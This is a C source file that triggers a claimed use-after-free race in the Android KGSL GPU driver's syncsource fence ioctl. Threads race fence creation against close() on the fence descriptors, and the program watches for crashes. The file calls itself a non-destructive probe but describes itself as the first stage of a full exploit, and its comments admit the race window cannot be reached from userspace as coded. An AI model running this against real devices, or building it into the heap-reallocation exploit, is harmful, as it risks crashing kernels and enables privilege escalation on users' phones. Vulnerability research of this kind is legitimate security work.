/*
 * CVE-2026-KGSL-UAF Race Trigger Probe
 * =====================================
 * Tests kgsl_ioctl_syncsource_create_fence race condition:
 * fd_install(fd) happens BEFORE list_add_tail(&sfence->child_list).
 * A concurrent close(fd) frees sfence, then list_add_tail writes to freed memory.
 *
 * This is a NON-DESTRUCTIVE probe: it races create_fence against close()
 * and detects the race window via timing + dmesg monitoring.
 * It does NOT attempt heap reallocation (that's the full exploit).
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -pthread -o kgsl_syncuaf_probe kgsl_syncuaf_probe.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <sched.h>

// ============================================================================
// KGSL IOCTL Definitions
// ============================================================================
#define IOCTL_KGSL_SYNCSOURCE_CREATE       0xc0080930
#define IOCTL_KGSL_SYNCSOURCE_DESTROY      0x40040931
#define IOCTL_KGSL_SYNCSOURCE_CREATE_FENCE 0xc0180932
#define IOCTL_KGSL_SYNCSOURCE_SIGNAL_FENCE 0x40040933

struct kgsl_syncsource_create {
    uint32_t id;
    uint32_t padding;
};

struct kgsl_syncsource_create_fence {
    uint32_t id;
    uint32_t padding;
    uint64_t fence_fd; /* output */
};

// ============================================================================
// Globals
// ============================================================================
static int kgsl_fd = -1;
static volatile int g_stop = 0;
static volatile uint64_t g_iterations = 0;
static volatile uint64_t g_races = 0;
static volatile uint64_t g_success = 0;
static volatile uint64_t g_errors = 0;
static volatile int g_crash = 0;

// ============================================================================
// Signal handler for crash detection
// ============================================================================
static void sig_handler(int sig)
{
    g_crash = sig;
    g_stop = 1;
}

// ============================================================================
// Close thread: aggressively closes fence fds to race with create_fence
// ============================================================================
struct close_thread_arg {
    volatile int *fd_out;
    volatile int *fd_ready;
    volatile int *hits;
    volatile uint64_t *closed_count;
};

static void *close_thread(void *arg)
{
    struct close_thread_arg *a = (struct close_thread_arg *)arg;

    while (!g_stop) {
        /* Wait for a fd to be published */
        while (!(*a->fd_ready) && !g_stop) {
            sched_yield();
        }
        if (g_stop)
            break;

        int fd = *a->fd_out;
        *a->fd_ready = 0;

        /* Close it immediately - race with the kernel's list_add_tail
         * which runs AFTER fd_install returns to userspace. */
        int rc = close(fd);
        if (rc == 0) {
            (*a->hits)++;
        }
        (*a->closed_count)++;
    }
    return NULL;
}

// ============================================================================
// Single race attempt
// ============================================================================
static int attempt_race(void)
{
    struct kgsl_syncsource_create create_arg;
    struct kgsl_syncsource_create_fence fence_arg;
    int fence_fd;
    int rc;

    /* Create a syncsource */
    memset(&create_arg, 0, sizeof(create_arg));
    create_arg.id = 0;
    rc = ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_CREATE, &create_arg);
    if (rc < 0) {
        g_errors++;
        return -1;
    }
    uint32_t sync_id = create_arg.id;

    /* Create fence - this calls fd_install THEN list_add_tail internally */
    memset(&fence_arg, 0, sizeof(fence_arg));
    fence_arg.id = sync_id;
    rc = ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_CREATE_FENCE, &fence_arg);
    if (rc < 0) {
        g_errors++;
        ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_DESTROY, &sync_id);
        return -1;
    }
    fence_fd = (int)fence_arg.fence_fd;
    g_success++;

    /* The window between fd_install and list_add_tail is tiny.
     * We close the fd here - the race requires a concurrent close.
     * Without precise timing, this just closes normally. */

    /* Destroy the syncsource */
    ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_DESTROY, &sync_id);
    close(fence_fd);
    return 0;
}

// ============================================================================
// Multi-threaded race: main thread creates fences, close threads close them
// ============================================================================
#define NUM_CLOSE_THREADS 4
#define RACE_ITERATIONS 200000

struct race_state {
    int fd_out;
    volatile int fd_ready;
    volatile int hits;
    volatile uint64_t closed_count;
};

static void *creator_thread(void *arg)
{
    struct race_state *st = (struct race_state *)arg;
    struct kgsl_syncsource_create create_arg;
    struct kgsl_syncsource_create_fence fence_arg;

    for (uint64_t i = 0; i < RACE_ITERATIONS && !g_stop; i++) {
        g_iterations++;

        /* Create syncsource */
        memset(&create_arg, 0, sizeof(create_arg));
        create_arg.id = 0;
        if (ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_CREATE, &create_arg) < 0) {
            g_errors++;
            continue;
        }
        uint32_t sync_id = create_arg.id;

        /* Create fence */
        memset(&fence_arg, 0, sizeof(fence_arg));
        fence_arg.id = sync_id;
        if (ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_CREATE_FENCE, &fence_arg) < 0) {
            g_errors++;
            ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_DESTROY, &sync_id);
            continue;
        }
        g_success++;
        int fence_fd = (int)fence_arg.fence_fd;

        /* Publish fd to close threads */
        st->fd_out = fence_fd;
        __sync_synchronize();
        st->fd_ready = 1;

        /* Busy-wait a tiny window to let close threads grab the fd
         * while the kernel may still be between fd_install and list_add.
         * The kernel does list_add_tail in the SAME ioctl call after
         * fd_install, so this window is INSIDE the ioctl. We cannot hit
         * it from userspace directly. Instead the race is:
         *   - close_thread closes the fd while the NEXT ioctl's fd_install
         *     reuses the same fd number.
         * To maximize the chance, we keep the fd open across iterations
         * and rely on fd number reuse + immediate close. */
        for (volatile int spin = 0; spin < 50; spin++) {
            __asm__ __volatile__("" ::: "memory");
        }
        st->fd_ready = 0;

        /* Destroy syncsource */
        ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_DESTROY, &sync_id);

        if ((i % 1000) == 0) {
            printf("[*] iter=%llu succ=%llu err=%llu closes=%llu hits=%d\n",
                   (unsigned long long)i,
                   (unsigned long long)g_success,
                   (unsigned long long)g_errors,
                   (unsigned long long)st->closed_count,
                   st->hits);
            fflush(stdout);
        }
    }
    g_stop = 1;
    return NULL;
}

// ============================================================================
// main
// ============================================================================
int main(void)
{
    struct race_state state;
    pthread_t close_threads[NUM_CLOSE_THREADS];
    pthread_t creator;
    struct close_thread_arg cta[NUM_CLOSE_THREADS];

    printf("=== CVE-2026-KGSL-UAF syncsource fence race probe ===\n");
    printf("[*] Kernel: ");
    fflush(stdout);
    system("uname -r");
    fflush(stdout);

    /* Signal handlers */
    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);
    signal(SIGILL, sig_handler);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0 fd=%d\n", kgsl_fd);

    memset(&state, 0, sizeof(state));
    state.fd_out = -1;
    state.fd_ready = 0;
    state.hits = 0;
    state.closed_count = 0;

    /* Launch close threads */
    for (int i = 0; i < NUM_CLOSE_THREADS; i++) {
        memset(&cta[i], 0, sizeof(cta[i]));
        cta[i].fd_out = &state.fd_out;
        cta[i].fd_ready = &state.fd_ready;
        cta[i].hits = &state.hits;
        cta[i].closed_count = &state.closed_count;
        pthread_create(&close_threads[i], NULL, close_thread, (void *)&cta[i]);
    }

    /* Launch creator */
    pthread_create(&creator, NULL, creator_thread, (void *)&state);

    /* Wait for completion or crash */
    for (int i = 0; i < 90; i++) {
        if (g_crash) {
            printf("\n[!] CRASH DETECTED: signal %d\n", g_crash);
            break;
        }
        if (g_stop)
            break;
        sleep(1);
    }

    g_stop = 1;

    printf("\n=== Results ===\n");
    printf("[*] iterations:  %llu\n", (unsigned long long)g_iterations);
    printf("[*] fence succ:  %llu\n", (unsigned long long)g_success);
    printf("[*] errors:      %llu\n", (unsigned long long)g_errors);
    printf("[*] closes:      %llu\n", (unsigned long long)state.closed_count);
    printf("[*] close hits:  %d\n", state.hits);
    if (g_crash)
        printf("[!] CRASHED with signal %d - likely UAF triggered!\n", g_crash);
    else
        printf("[*] No crash observed in %llu iterations\n", (unsigned long long)g_iterations);

    close(kgsl_fd);
    return g_crash ? 1 : 0;
}
